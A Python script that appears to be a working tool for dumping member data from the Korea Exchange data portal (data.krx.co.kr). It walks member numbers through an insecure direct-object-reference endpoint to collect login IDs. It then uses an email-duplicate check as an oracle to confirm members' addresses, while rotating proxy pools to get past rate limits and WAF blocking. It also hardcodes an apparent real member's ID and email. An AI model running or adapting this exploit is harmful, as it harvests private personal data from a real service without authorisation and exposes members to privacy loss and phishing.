#!/usr/bin/env python3
"""data.krx.co.kr member email dump: IDOR mbrNo -> MBR_ID -> isDupMbrEmail.

WAF/HTML/redirect is never an empty member. 407 proxies are dropped on the
first failure. Working proxies are kept. Direct IP is never used when a
panda extract URL is configured.
"""
from __future__ import annotations

import argparse
import csv
import json
import os
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests

BASE = "https://data.krx.co.kr"
IDOR = BASE + "/comm/bldAttendant/getJsonData.cmd"
DUP = BASE + "/contents/MDC/COMS/client/isDupMbrEmail.cmd"
DOMS_PRIMARY = ["naver.com", "gmail.com", "hanmail.net", "daum.net", "kakao.com", "krx.co.kr"]
DOMS_EXTRA = [
    "nate.com",
    "outlook.com",
    "hotmail.com",
    "yahoo.com",
    "yahoo.co.kr",
    "icloud.com",
    "me.com",
    "googlemail.com",
    "outlook.kr",
    "hanmail.com",
    "korea.com",
    "dreamwiz.com",
    "proton.me",
    "krx.or.kr",
]
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
START = int(os.environ.get("KRX_START", "2000005000"))
END = int(os.environ.get("KRX_END", "2000223000"))
WORKERS = int(os.environ.get("KRX_WORKERS", "16"))
OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
STATIC_PROXY = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "").rstrip("/")
PROXY_AUTH = os.environ.get("KRX_PROXY_AUTH", "").strip()
PROXY_TTL = int(os.environ.get("KRX_PROXY_TTL", "90"))
EXTRACT_COUNT = int(os.environ.get("KRX_EXTRACT_COUNT", "10"))
KEEP_LIVE = int(os.environ.get("KRX_KEEP_LIVE", "12"))
PICK_N = int(os.environ.get("KRX_PICK_N", "12"))
USE_DIRECT = os.environ.get("KRX_USE_DIRECT", "1") != "0"
DIRECT = "__direct__"
DIRECT_COOLDOWN = int(os.environ.get("KRX_DIRECT_COOLDOWN", "180"))
EXTRACT_DEAD_HINTS = ("用完", "不足", "余额", "过期", "失效", "次数已", "提取失败", "订单不存在", "INVALID")
CLOUD_GOOD_FROM = 2000005966
KNOWN_MBR = 2000008331
KNOWN_ID = "ryujt"
EMPTY_MBR = 1999999999

_tls = threading.local()
_lock = threading.Lock()
_stats = {"done": 0, "ids": 0, "emails": 0, "err": 0, "retry": 0, "t0": time.time()}
POOL: "ProxyPool | None" = None


def with_extract_count(url: str, n: int) -> str:
    p = urlparse(url)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    q["count"] = str(n)
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(q), p.fragment))


def extract_is_dead(text: str) -> bool:
    t = text or ""
    if not t:
        return False
    return any(h in t for h in EXTRACT_DEAD_HINTS)


def panda_urls() -> list[str]:
    urls: list[str] = []
    u = os.environ.get("KRX_PANDA_URL", "").strip()
    if u:
        urls.append(u)
    for i in range(2, 9):
        u = os.environ.get(f"KRX_PANDA_URL_{i}", "").strip()
        if u:
            urls.append(u)
    for part in os.environ.get("KRX_PANDA_URLS", "").split("|"):
        part = part.strip()
        if part:
            urls.append(part)
    # de-dupe preserve order
    out: list[str] = []
    for u in urls:
        if u not in out:
            out.append(u)
    return out


def inject_auth(proxy: str, extra_auth: str = "") -> str:
    auth = extra_auth or PROXY_AUTH
    if not auth:
        return proxy
    p = urlparse(proxy)
    host = p.hostname or ""
    port = f":{p.port}" if p.port else ""
    if p.username:
        return proxy
    return urlunparse((p.scheme or "http", f"{auth}@{host}{port}", p.path, "", p.query, ""))


def parse_proxy_line(line: str, extra_auth: str = "") -> str | None:
    line = (line or "").replace("\r", "").strip()
    if not line or line.startswith("{") or line.startswith("<"):
        return None
    low = line.lower()
    if "code" in low and ("invalid" in low or "请按规定" in line or "error" in low):
        return None
    if "://" in line:
        return inject_auth(line, extra_auth)
    if "@" in line and line.count(":") >= 2:
        return inject_auth("http://" + line, extra_auth)
    parts = line.split(":")
    if len(parts) == 2:
        ip, port = parts
        if not port.isdigit():
            return None
        return inject_auth(f"http://{ip}:{port}", extra_auth)
    if len(parts) >= 4:
        ip, port, user, pwd = parts[0], parts[1], parts[2], ":".join(parts[3:])
        if not port.isdigit():
            return None
        return f"http://{user}:{pwd}@{ip}:{port}"
    return None


def parse_extract_body(text: str, extra_auth: str = "") -> list[str]:
    text = (text or "").strip()
    if not text:
        return []
    if text.startswith("{"):
        try:
            j = json.loads(text)
        except Exception:
            return []
        items = j.get("obj") or j.get("data") or []
        out: list[str] = []
        if isinstance(items, list):
            for item in items:
                if not isinstance(item, dict):
                    continue
                ip = str(item.get("ip") or "").strip()
                port = str(item.get("port") or "").strip()
                if not ip or not port:
                    continue
                user = str(
                    item.get("account")
                    or item.get("user")
                    or item.get("username")
                    or item.get("acc")
                    or ""
                ).strip()
                pwd = str(item.get("password") or item.get("pwd") or item.get("pass") or "").strip()
                if user and pwd:
                    out.append(f"http://{user}:{pwd}@{ip}:{port}")
                else:
                    p = parse_proxy_line(f"{ip}:{port}", extra_auth)
                    if p:
                        out.append(p)
        return out
    got: list[str] = []
    for line in text.splitlines():
        p = parse_proxy_line(line, extra_auth)
        if p:
            got.append(p)
    return got


def is_waf_text(status: int, text: str) -> bool:
    if status != 200:
        return True
    head = (text or "")[:800]
    if head.lstrip().startswith("<"):
        return True
    return any(
        s in head
        for s in (
            "에러페이지",
            "Access Denied",
            "document has been moved",
            "ERROR: The request could not be satisfied",
        )
    )


def is_proxy_auth_fail(exc: BaseException | None = None, text: str = "") -> bool:
    blob = f"{exc} {text}".lower()
    return "407" in blob or "white list" in blob or "not authorized" in blob


def json_from_response(resp: requests.Response) -> dict[str, Any] | None:
    if is_waf_text(resp.status_code, resp.text):
        return None
    try:
        data = resp.json()
    except Exception:
        return None
    return data if isinstance(data, dict) else None


class ProxyPool:
    def __init__(self, urls: list[str] | None = None, static: str = "", extra_auth: str = "") -> None:
        self.urls = urls if urls is not None else panda_urls()
        self.static = static.rstrip("/") if static else STATIC_PROXY
        self.extra_auth = extra_auth or PROXY_AUTH
        self.proxies: list[str] = []
        self.good: list[str] = []
        self.bad: set[str] = set()
        self.strikes: dict[str, int] = {}
        self.born: dict[str, float] = {}
        self.dead_urls: set[str] = set()
        self.empty_streak: dict[str, int] = {}
        self.last_fetch = 0.0
        self.ui = 0
        self.i = 0
        self._fetch_lock = threading.Lock()
        self.use_direct = USE_DIRECT
        self.direct_until = 0.0
        self.allow_direct = self.use_direct or not self.urls
        if self.static and not self.urls:
            self.proxies = [self.static]
            self.born[self.static] = time.time()

    def _alive_urls(self) -> list[str]:
        return [u for u in self.urls if u not in self.dead_urls]

    def _fresh(self, proxy: str) -> bool:
        if proxy in self.bad:
            return False
        return (time.time() - self.born.get(proxy, 0)) < PROXY_TTL

    def live_list(self) -> list[str]:
        return [p for p in self.proxies if self._fresh(p)]

    def live_n(self) -> int:
        return len(self.live_list())

    def good_n(self) -> int:
        return len([p for p in self.good if self._fresh(p)])

    def _probe(self, proxy: str) -> bool:
        s = requests.Session()
        s.trust_env = False
        s.proxies = {"http": proxy, "https": proxy}
        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
        try:
            r = s.post(
                IDOR,
                data={"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(KNOWN_MBR)},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=6,
            )
            if is_proxy_auth_fail(text=r.text) or r.status_code == 407:
                return False
            body = json_from_response(r)
            return bool(body and "block1" in body)
        except Exception as e:
            return not is_proxy_auth_fail(e) and False

    def _expire_old(self) -> None:
        now = time.time()
        dead = [p for p, t0 in self.born.items() if now - t0 >= PROXY_TTL]
        for p in dead:
            self.bad.add(p)
            if p in self.good:
                self.good.remove(p)

    def _next_url(self) -> str | None:
        alive = self._alive_urls()
        if not alive:
            return None
        url = alive[self.ui % len(alive)]
        self.ui += 1
        return url

    def fetch(self) -> None:
        if not self.urls:
            return
        if not self._fetch_lock.acquire(blocking=False):
            time.sleep(0.2)
            return
        try:
            if self.good_n() >= KEEP_LIVE:
                return
            url = self._next_url()
            if url is None:
                print("api_exhausted all extract URLs used up", flush=True)
                time.sleep(2)
                return
            wait = 1.05 - (time.time() - self.last_fetch)
            if wait > 0:
                time.sleep(wait)
            get_url = with_extract_count(url, EXTRACT_COUNT) if EXTRACT_COUNT > 0 else url
            try:
                r = requests.get(get_url, timeout=15)
                self.last_fetch = time.time()
                text = r.text
            except Exception as e:
                self.last_fetch = time.time()
                print(f"extract_err {type(e).__name__}", flush=True)
                return
            if extract_is_dead(text):
                self.dead_urls.add(url)
                print(f"api_dead {url.split('orderNo=')[-1][:28]} {text[:80].replace(chr(10),' ')}", flush=True)
                return
            got = parse_extract_body(text, self.extra_auth)
            if not got:
                n = self.empty_streak.get(url, 0) + 1
                self.empty_streak[url] = n
                if n >= 3:
                    self.dead_urls.add(url)
                    print(f"api_dead_empty {url.split('orderNo=')[-1][:28]}", flush=True)
                return
            self.empty_streak[url] = 0
            ok_list: list[str] = []
            with ThreadPoolExecutor(max_workers=min(8, len(got))) as ex:
                futs = {ex.submit(self._probe, p): p for p in got}
                for fut in as_completed(futs):
                    p = futs[fut]
                    try:
                        if fut.result():
                            ok_list.append(p)
                    except Exception:
                        pass
            now = time.time()
            with _lock:
                for p in got:
                    if p not in ok_list:
                        self.bad.add(p)
                        if p in self.good:
                            self.good.remove(p)
                        continue
                    if p not in self.proxies:
                        self.proxies.append(p)
                    self.bad.discard(p)
                    self.strikes.pop(p, None)
                    self.born[p] = now
                    if p not in self.good:
                        self.good.append(p)
                self._expire_old()
            print(
                f"proxy_pool +{len(got)} usable={len(ok_list)} good={self.good_n()} "
                f"apis={len(self._alive_urls())}/{len(self.urls)}",
                flush=True,
            )
        finally:
            self._fetch_lock.release()

    def fetch_all(self) -> None:
        for _ in list(self._alive_urls()):
            self.fetch()

    def pick(self) -> str | None:
        with _lock:
            self._expire_old()
            fresh = [p for p in self.good if self._fresh(p)]
            fresh.sort(key=lambda p: self.born.get(p, 0), reverse=True)
            live = fresh[:PICK_N]
            direct_ok = self.use_direct and time.time() >= self.direct_until
        if direct_ok:
            live = live + [DIRECT]
        if live:
            with _lock:
                self.i += 1
                return live[self.i % len(live)]
        if self.use_direct:
            return DIRECT
        return None

    def ok(self, proxy: str | None) -> None:
        if not proxy:
            return
        if proxy == DIRECT:
            with _lock:
                self.direct_until = 0.0
            return
        with _lock:
            if not self._fresh(proxy):
                return
            self.strikes.pop(proxy, None)
            self.bad.discard(proxy)
            if proxy not in self.good:
                self.good.append(proxy)

    def fail(self, proxy: str | None, auth: bool = False) -> None:
        if not proxy:
            return
        if proxy == DIRECT:
            with _lock:
                _stats["retry"] += 1
                self.direct_until = time.time() + DIRECT_COOLDOWN
            print(f"direct_cooldown {DIRECT_COOLDOWN}s", flush=True)
            return
        with _lock:
            _stats["retry"] += 1
            if auth:
                self.strikes[proxy] = 99
                self.bad.add(proxy)
                if proxy in self.good:
                    self.good.remove(proxy)
            else:
                n = self.strikes.get(proxy, 0) + 1
                self.strikes[proxy] = n
                if n >= 2:
                    self.bad.add(proxy)
                    if proxy in self.good:
                        self.good.remove(proxy)
        # Do not fetch here. Scanning threads must not block on extract/probe.


def session_for(proxy: str | None) -> requests.Session:
    cache: dict[str, requests.Session] = getattr(_tls, "cache", None) or {}
    _tls.cache = cache
    key = proxy or "direct"
    s = cache.get(key)
    if s is None:
        s = requests.Session()
        s.trust_env = False
        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
        s.mount("https://", requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0))
        if proxy and proxy != DIRECT:
            s.proxies.update({"http": proxy, "https": proxy})
        cache[key] = s
        if len(cache) > 12:
            old = next(iter(cache))
            if old != key:
                cache.pop(old, None)
    return s


def drop_session(proxy: str | None) -> None:
    cache = getattr(_tls, "cache", None)
    if cache:
        cache.pop(proxy or "direct", None)


def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
    pool = POOL
    if pool is None:
        raise RuntimeError("proxy pool not initialized")
    fails = 0
    while True:
        proxy = pool.pick()
        if proxy is None:
            time.sleep(0.4)
            continue
        s = session_for(proxy)
        try:
            r = s.post(
                url,
                data=data,
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=15,
            )
            if is_proxy_auth_fail(text=r.text):
                drop_session(proxy)
                pool.fail(proxy, auth=True)
                fails += 1
                continue
            body = json_from_response(r)
            if body is not None and need in body:
                pool.ok(proxy)
                return body
        except Exception as e:
            drop_session(proxy)
            pool.fail(proxy, auth=is_proxy_auth_fail(e))
            fails += 1
            if fails % 4 == 0:
                time.sleep(min(0.25 * (fails // 4), 2.0) + random.random() * 0.2)
            continue
        drop_session(proxy)
        pool.fail(proxy)
        fails += 1
        if fails % 4 == 0:
            time.sleep(min(0.25 * (fails // 4), 2.0) + random.random() * 0.2)


def mbr_id(mno: int) -> str | None:
    body = post_ok(
        IDOR,
        {"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
        "block1",
    )
    block = body.get("block1") or []
    if not block:
        return None
    return block[0].get("MBR_ID")


def dup_email(mid: str, domains: list[str]) -> str | None:
    for d in domains:
        em = f"{mid}@{d}"
        body = post_ok(DUP, {"email": em}, "isDupMbrEmail")
        val = body.get("isDupMbrEmail")
        if val is True or str(val).lower() == "true":
            return em
    return None


def one_idor(mno: int) -> tuple[int, str | None, str | None]:
    while True:
        try:
            mid = mbr_id(mno)
            if not mid:
                return mno, None, None
            return mno, mid, dup_email(mid, DOMS_PRIMARY)
        except Exception:
            with _lock:
                _stats["err"] += 1
            time.sleep(1.5)


def one_mail(mno: int, mid: str) -> tuple[int, str | None, str | None]:
    while True:
        try:
            return mno, mid, dup_email(mid, DOMS_EXTRA)
        except Exception:
            with _lock:
                _stats["err"] += 1
            time.sleep(1.5)


def load_csv_map(path: str) -> dict[int, str]:
    out: dict[int, str] = {}
    if not os.path.exists(path):
        return out
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.reader(f):
            if not row or row[0] in {"mbrNo", "mno"}:
                continue
            try:
                out[int(row[0])] = row[1] if len(row) > 1 else ""
            except ValueError:
                continue
    return out


def load_scanned_status(path: str) -> dict[int, str]:
    out: dict[int, str] = {}
    if not os.path.exists(path):
        return out
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.reader(f):
            if not row or row[0] in {"mbrNo"}:
                continue
            try:
                out[int(row[0])] = row[1] if len(row) > 1 else ""
            except ValueError:
                continue
    return out


def build_jobs(
    start: int,
    end: int,
    have_id: dict[int, str],
    have_email: dict[int, str],
    scanned: dict[int, str],
    cloud_good_from: int = CLOUD_GOOD_FROM,
) -> tuple[list[tuple[int, str]], list[int], list[int], list[int]]:
    confirmed_empty = {n for n, st in scanned.items() if st == "empty"}
    nomail = {n for n, st in scanned.items() if st == "nomail"}
    seen_skip = set(have_id) | confirmed_empty
    last_id = max(have_id) if have_id else start
    head = [n for n in range(start, min(end, cloud_good_from - 1) + 1) if n not in seen_skip]
    tail_from = max(start, last_id + 1)
    tail = [n for n in range(tail_from, end + 1) if n not in seen_skip]
    holes = [
        n
        for n in range(max(start, cloud_good_from), min(end, last_id) + 1)
        if n not in seen_skip
    ]
    mail_jobs = [
        (n, mid)
        for n, mid in have_id.items()
        if n not in have_email and n not in nomail and mid
    ]
    return mail_jobs, head, tail, holes


def init_pool(urls: list[str] | None = None) -> ProxyPool:
    global POOL
    POOL = ProxyPool(urls=urls)
    return POOL


def selftest() -> int:
    """Live checks against panda + KRX. Return 0 if safe to dump."""
    urls = panda_urls()
    print("selftest urls", len(urls), flush=True)
    if not urls:
        print("FAIL no panda urls", flush=True)
        return 1
    pool = init_pool(urls)
    pool.fetch_all()
    if pool.live_n() < 1:
        print("FAIL extract empty", flush=True)
        return 1
    parsed = parse_extract_body("1.2.3.4:80\r\n5.6.7.8:90\r\n")
    if parsed != ["http://1.2.3.4:80", "http://5.6.7.8:90"]:
        print("FAIL crlf parse", parsed, flush=True)
        return 1

    last_hit = None
    functional_ok = False
    for proxy in list(pool.proxies):
        s = requests.Session()
        s.trust_env = False
        s.proxies = {"http": proxy, "https": proxy}
        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})

        def post_now(mno: int):
            r = s.post(
                IDOR,
                data={"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=16,
            )
            body = json_from_response(r)
            if body is None or "block1" not in body:
                raise RuntimeError(f"bad json {r.status_code} {r.text[:120]}")
            block = body.get("block1") or []
            return None if not block else block[0].get("MBR_ID")

        try:
            mid = post_now(KNOWN_MBR)
        except Exception as e:
            pool.fail(proxy, auth=is_proxy_auth_fail(e))
            print("probe_exc", proxy, type(e).__name__, str(e)[:100], flush=True)
            continue
        if mid != KNOWN_ID:
            pool.fail(proxy, auth=True)
            print("probe_bad", proxy, mid, flush=True)
            continue
        pool.ok(proxy)
        print("probe_ok", proxy, flush=True)
        try:
            empty = post_now(EMPTY_MBR)
            if empty is not None:
                print("FAIL empty mbr should be None", empty, flush=True)
                return 1
            for n in (2000222668, 2000222700, 2000222800, 2000223000, 2000224000):
                midn = post_now(n)
                print("tail", n, midn, flush=True)
                if midn:
                    last_hit = (n, midn)
            r_true = s.post(
                DUP,
                data={"email": "ryujt@naver.com"},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=16,
            )
            r_false = s.post(
                DUP,
                data={"email": "zzznomatchkrx999@naver.com"},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=16,
            )
            bt = json_from_response(r_true) or {}
            bf = json_from_response(r_false) or {}
            tval = str(bt.get("isDupMbrEmail")).lower() == "true"
            fval = str(bf.get("isDupMbrEmail")).lower() == "true"
            print("dup", "ryujt@naver.com", tval, "nomatch", fval, flush=True)
            if "isDupMbrEmail" not in bt or "isDupMbrEmail" not in bf:
                print("FAIL dup json", bt, bf, flush=True)
                return 1
            if fval:
                print("FAIL collision oracle always true", flush=True)
                return 1
            functional_ok = True
            break
        except Exception as e:
            print("probe_died_after_ok", proxy, type(e).__name__, str(e)[:100], flush=True)
            pool.fail(proxy, auth=is_proxy_auth_fail(e))
            continue

    print(f"probe good={len(pool.good)}", flush=True)
    if not functional_ok:
        print("FAIL no working proxy stayed alive for IDOR+dup", flush=True)
        return 1
    print("SELFTEST_OK good_proxies", len(pool.good), "tail", last_hit, flush=True)
    return 0


def main() -> None:
    os.makedirs(OUTDIR, exist_ok=True)
    state_path = os.path.join(OUTDIR, "state.json")
    scanned_path = os.path.join(OUTDIR, "scanned.csv")
    email_path = os.path.join(OUTDIR, "emails.csv")
    id_path = os.path.join(OUTDIR, "ids.csv")

    have_id = load_csv_map(id_path)
    have_email = load_csv_map(email_path)
    scanned = load_scanned_status(scanned_path)

    email_new = not os.path.exists(email_path)
    id_new = not os.path.exists(id_path)
    scan_new = not os.path.exists(scanned_path)
    ef = open(email_path, "a", newline="", encoding="utf-8")
    idf = open(id_path, "a", newline="", encoding="utf-8")
    sf = open(scanned_path, "a", newline="", encoding="utf-8")
    ew, iw, sw = csv.writer(ef), csv.writer(idf), csv.writer(sf)
    if email_new:
        ew.writerow(["mbrNo", "mbrId", "email"])
    if id_new:
        iw.writerow(["mbrNo", "mbrId"])
    if scan_new:
        sw.writerow(["mbrNo", "status", "mbrId"])

    pool = init_pool()
    if pool.urls:
        pool.fetch_all()

    def _topup() -> None:
        while True:
            time.sleep(12)
            try:
                if pool.good_n() < KEEP_LIVE and pool._alive_urls():
                    pool.fetch()
            except Exception:
                pass

    threading.Thread(target=_topup, name="proxy-topup", daemon=True).start()

    mail_jobs, head, tail, holes = build_jobs(START, END, have_id, have_email, scanned)
    idor_jobs = tail + head + holes
    total = len(mail_jobs) + len(idor_jobs)
    print(
        f"workers={WORKERS} mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
        f"head={len(head)} tail={len(tail)} holes={len(holes)} "
        f"have_id={len(have_id)} have_email={len(have_email)} panda={len(pool.urls)}",
        flush=True,
    )
    last_flush = time.time()
    wrote_id = set(have_id)
    wrote_em = set(have_email)

    def handle(mno: int, mid: str | None, em: str | None, kind: str) -> None:
        nonlocal last_flush
        with _lock:
            _stats["done"] += 1
            if kind == "idor":
                sw.writerow([mno, "id" if mid else "empty", mid or ""])
                if mid and mno not in wrote_id:
                    _stats["ids"] += 1
                    wrote_id.add(mno)
                    iw.writerow([mno, mid])
            elif kind == "mail" and not em:
                sw.writerow([mno, "nomail", mid or ""])
            if em and mno not in wrote_em:
                _stats["emails"] += 1
                wrote_em.add(mno)
                ew.writerow([mno, mid, em])
            ef.flush()
            idf.flush()
            sf.flush()
            done = _stats["done"]
            if time.time() - last_flush > 5:
                elapsed = max(time.time() - _stats["t0"], 0.001)
                rate = done / elapsed
                remain = max(total - done, 0)
                eta = remain / rate if rate else 0
                json.dump(
                    {
                        "done": done,
                        "total": total,
                        "ids": _stats["ids"],
                        "emails": _stats["emails"],
                        "err": _stats["err"],
                        "retry": _stats["retry"],
                        "good_proxies": len(pool.good),
                        "rate_per_s": round(rate, 2),
                        "eta_min": round(eta / 60, 1),
                        "last": mno,
                    },
                    open(state_path, "w"),
                )
                print(
                    f"done={done}/{total} ids+={_stats['ids']} emails+={_stats['emails']} "
                    f"retry={_stats['retry']} good={len(pool.good)} "
                    f"{rate:.1f}/s eta={eta/60:.1f}min last={mno}",
                    flush=True,
                )
                last_flush = time.time()

    def run_batch(futs, kind: str) -> None:
        for fut in as_completed(futs):
            mno, mid, em = fut.result()
            handle(mno, mid, em, kind)

    chunk = 80
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        i = 0
        while i < len(idor_jobs):
            batch = idor_jobs[i : i + chunk]
            run_batch([ex.submit(one_idor, n) for n in batch], "idor")
            i += chunk
        i = 0
        while i < len(mail_jobs):
            batch = mail_jobs[i : i + chunk]
            run_batch([ex.submit(one_mail, n, mid) for n, mid in batch], "mail")
            i += chunk

    ef.close()
    idf.close()
    sf.close()
    print("FINISHED", _stats, flush=True)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        raise SystemExit(selftest())
    main()
